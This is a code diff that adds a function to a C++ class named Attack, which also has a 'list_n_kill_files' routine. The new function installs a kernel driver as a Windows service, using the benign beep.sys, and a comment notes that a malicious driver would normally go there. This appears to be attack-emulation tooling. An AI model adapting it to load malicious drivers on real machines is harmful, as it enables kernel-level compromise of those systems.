@@ -109,3 +109,59 @@ vector<wstring> Attack::list_n_kill_files(wstring path)
 	FindClose(hFind);
 	return matches;
 }
+
+void Attack::LoadDriverBeep()
+{
+	SC_HANDLE schSCManager, schService;
+
+	// the driver location, normally we would bring on a malicious one
+	// but this is a test one
+	LPCTSTR lpszDriverPathName = L"%SystemRoot%\\system32\\drivers\\beep.sys";
+	// service display name
+	LPCTSTR lpszDisplayName = L"CustomBeep";
+	// Registry Subkey
+	LPCTSTR lpszServiceName = L"MyCustomBeep";
+
+	// open handle to the SC Manager database
+	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); // full access rights
+
+	if (NULL == schSCManager)
+	{
+		std::cout << "OpenSCManager() failed, error: " << GetLastError() << std::endl;
+	}
+	else {
+		std::cout << "OpenSCManager() loaded OK." << std::endl;
+	}
+
+	// Create/install service
+	schService = CreateService(
+		schSCManager,
+		lpszServiceName,
+		lpszDisplayName,
+		SERVICE_ALL_ACCESS,
+		SERVICE_KERNEL_DRIVER, // find types /api/winsvc/nf-winsvc-createservicea
+		SERVICE_DEMAND_START,
+		SERVICE_ERROR_NORMAL,
+		lpszDriverPathName,
+		NULL,
+		NULL,
+		NULL,
+		NULL,
+		NULL
+	);
+
+	if (schService == NULL)
+	{
+		std::cout << "CreateService() failed, error: " << GetLastError() << std::endl;
+	}
+	else {
+		std::cout << "CreateService() for %S" << lpszServiceName << " loaded OK." << std::endl;
+		if (CloseServiceHandle(schService) == 0)
+		{
+			std::cout << "CloseServiceHandle() failed, error: " << GetLastError() << std::endl;
+		} 
+		else {
+			std::cout << "CloseServiceHandle() is OK." << std::endl;
+		}
+	}
+}
